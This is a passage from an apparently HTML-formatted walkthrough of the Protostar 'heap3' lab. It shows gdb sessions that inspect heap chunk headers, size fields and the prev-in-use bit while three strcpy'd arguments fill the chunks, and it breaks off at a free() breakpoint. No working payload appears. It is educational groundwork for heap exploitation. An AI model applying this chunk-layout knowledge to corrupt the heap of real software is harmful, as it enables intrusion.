</span><span class='line'><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="n">AAAAAAAAAAAA</span> <span class="n">BBBBBBBBBBBB</span> <span class="n">CCCCCCCCCCCC</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">bytes</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3211</span>
</span><span class='line'><span class="mi">3211</span>  <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="n">or</span> <span class="n">directory</span><span class="p">.</span>
</span><span class='line'>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ve hit the first breakpoint. Continue past it so that one <code>malloc()</code> is called and the heap is
initialized.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">bytes</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3211</span>
</span><span class='line'><span class="mi">3211</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now look at the mapped memory regions.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="n">proc</span> <span class="n">mapping</span>
</span><span class='line'><span class="n">process</span> <span class="mi">1542</span>
</span><span class='line'><span class="n">cmdline</span> <span class="o">=</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">cwd</span> <span class="o">=</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">exe</span> <span class="o">=</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">Mapped</span> <span class="n">address</span> <span class="nl">spaces</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">Start</span> <span class="n">Addr</span>   <span class="n">End</span> <span class="n">Addr</span>       <span class="n">Size</span>     <span class="n">Offset</span> <span class="n">objfile</span>
</span><span class='line'>   <span class="mh">0x8048000</span>  <span class="mh">0x804b000</span>     <span class="mh">0x3000</span>          <span class="mi">0</span>        <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span>
</span><span class='line'>   <span class="mh">0x804b000</span>  <span class="mh">0x804c000</span>     <span class="mh">0x1000</span>     <span class="mh">0x3000</span>        <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span>
</span><span class='line'>   <span class="mh">0x804c000</span>  <span class="mh">0x804d000</span>     <span class="mh">0x1000</span>          <span class="mi">0</span>           <span class="p">[</span><span class="n">heap</span><span class="p">]</span>
</span><span class='line'>  <span class="mh">0xb7e96000</span> <span class="mh">0xb7e97000</span>     <span class="mh">0x1000</span>          <span class="mi">0</span>
</span><span class='line'>  <span class="mh">0xb7e97000</span> <span class="mh">0xb7fd5000</span>   <span class="mh">0x13e000</span>          <span class="mi">0</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
</span><span class='line'>  <span class="mh">0xb7fd5000</span> <span class="mh">0xb7fd6000</span>     <span class="mh">0x1000</span>   <span class="mh">0x13e000</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
</span><span class='line'>  <span class="mh">0xb7fd6000</span> <span class="mh">0xb7fd8000</span>     <span class="mh">0x2000</span>   <span class="mh">0x13e000</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
</span><span class='line'>  <span class="mh">0xb7fd8000</span> <span class="mh">0xb7fd9000</span>     <span class="mh">0x1000</span>   <span class="mh">0x140000</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
</span><span class='line'>  <span class="mh">0xb7fd9000</span> <span class="mh">0xb7fdc000</span>     <span class="mh">0x3000</span>          <span class="mi">0</span>
</span><span class='line'>  <span class="mh">0xb7fe0000</span> <span class="mh">0xb7fe2000</span>     <span class="mh">0x2000</span>          <span class="mi">0</span>
</span><span class='line'>  <span class="mh">0xb7fe2000</span> <span class="mh">0xb7fe3000</span>     <span class="mh">0x1000</span>          <span class="mi">0</span>           <span class="p">[</span><span class="n">vdso</span><span class="p">]</span>
</span><span class='line'>  <span class="mh">0xb7fe3000</span> <span class="mh">0xb7ffe000</span>    <span class="mh">0x1b000</span>          <span class="mi">0</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
</span><span class='line'>  <span class="mh">0xb7ffe000</span> <span class="mh">0xb7fff000</span>     <span class="mh">0x1000</span>    <span class="mh">0x1a000</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
</span><span class='line'>  <span class="mh">0xb7fff000</span> <span class="mh">0xb8000000</span>     <span class="mh">0x1000</span>    <span class="mh">0x1b000</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
</span><span class='line'>  <span class="mh">0xbffeb000</span> <span class="mh">0xc0000000</span>    <span class="mh">0x15000</span>          <span class="mi">0</span>           <span class="p">[</span><span class="n">stack</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>The heap starts at <code>0x804c000</code>, ends at <code>0x804d000</code>, and has size <code>0x1000</code> or 4096 bytes. We can
define hooks in gdb. We define one to examine the first 56 words of the heap in hexadecimal every
time execution stops.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">define</span> <span class="n">hook</span><span class="o">-</span><span class="n">stop</span>
</span><span class='line'><span class="n">Type</span> <span class="n">commands</span> <span class="k">for</span> <span class="n">definition</span> <span class="n">of</span> <span class="s">&quot;hook-stop&quot;</span><span class="p">.</span>
</span><span class='line'><span class="n">End</span> <span class="n">with</span> <span class="n">a</span> <span class="n">line</span> <span class="n">saying</span> <span class="n">just</span> <span class="s">&quot;end&quot;</span><span class="p">.</span>
</span><span class='line'><span class="o">&gt;</span><span class="n">x</span><span class="o">/</span><span class="mi">56</span><span class="n">wx</span> <span class="mh">0x804c000</span>
</span><span class='line'><span class="o">&gt;</span><span class="n">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>If we continue, we hit the third malloc. At this point two <code>malloc()</code>&rsquo;s have been called.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000fb1</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">bytes</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3211</span>
</span><span class='line'><span class="mi">3211</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p>The second word of the chunk up to the last three bits indicates the chunk size in bytes. <code>0x29</code> is
<code>0b101001</code>. Without the last three bits it&rsquo;s <code>0b101000</code> which is 40. We can see the chunk starts at
<code>0x804c000</code> and ends at <code>0x804c028</code> which is the start of the next chunk. This range encompasses
10 words. Each word is 4 bytes which makes 10 * 4 = 40 bytes. The last bit of the size word
indicates that the previous chunk is in use. By convention the first chunk has this bit turned on
because there&rsquo;s no previous chunk that&rsquo;s free.</p>

<p>The second chunk resulting from the second <code>malloc()</code> starts at <code>0x804c028</code> and ends at <code>0x804c050</code>.
It&rsquo;s identical to the first chunk. Continue past the third <code>malloc()</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x08048750</span> <span class="n">in</span> <span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span> <span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>We see a third chunk is created. The number at the end (right now <code>0x00000f89</code>) indicates the
remaining size of the heap. It has been decreasing. Continue past the first <code>strcpy()</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x08048750</span> <span class="n">in</span> <span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span> <span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>We see the the 12 <code>A</code>&rsquo;s (ASCII value 41) have been written to the heap. Continue two more times past
the remaining two <code>strcpy()</code>&rsquo;s.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x08048750</span> <span class="n">in</span> <span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span> <span class="p">()</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804c058</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3583</span>
